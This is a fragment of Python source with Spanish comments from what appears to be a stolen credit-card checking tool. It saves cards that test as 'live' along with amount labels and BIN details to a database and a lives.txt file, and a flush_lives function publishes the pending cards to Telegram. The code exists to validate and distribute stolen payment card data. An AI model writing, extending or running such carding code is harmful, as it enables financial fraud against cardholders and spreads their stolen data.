...
def guardar_live(card, monto_label, bin_info):
    # --- Integración: insertar en BD compartida ---
    insertada = insert_pending(card)
    if insertada:
        logger.info("Live insertada en BD para publicación: %s", card)
    else:
        logger.info("Live ya existía en BD: %s", card)
    # ---------------------------------------------

    # Guardar también en lives.txt (funcionalidad original)
    info = " | ".join(f"{k}:{v}" for k, v in bin_info.items() if v) if bin_info else ""
    nueva_linea = f"{card} | {monto_label} | {info}\n"
    archivo = "lives.txt"
    with lock:
        try:
...
# ----------------------------------------------------------------------
# NUEVA FUNCIÓN: publica todas las tarjetas pendientes en Telegram
def flush_lives():
    """
    Publica todas las tarjetas pendientes en Telegram.
    Se llama desde interfaz.py al finalizar un check con lives.
    """
    from publisher import publish_pending_cards, get_pending_count

    pendientes = get_pending_count()
    if pendientes == 0:
        logger.info("No hay tarjetas pendientes para publicar.")
        return 0

    logger.info("Hay %d tarjetas pendientes. Iniciando publicación...", pendientes)
    enviadas = publish_pending_cards()
    logger.info("Publicación finalizada: %d enviadas.", enviadas)
    return enviadas
